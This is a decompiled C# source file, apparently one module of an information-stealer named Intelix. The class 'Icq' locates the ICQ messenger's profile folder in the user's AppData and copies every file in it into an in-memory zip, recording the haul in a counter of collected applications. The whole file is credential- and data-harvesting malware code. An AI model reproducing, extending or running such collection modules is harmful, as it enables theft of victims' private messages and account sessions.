using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x02000019 RID: 25
	public class Icq : ITarget
	{
		// Token: 0x0600004B RID: 75 RVA: 0x00003B88 File Offset: 0x00001D88
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ICQ", "0001");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string text2 = "ICQ\\0001";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "ICQ";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
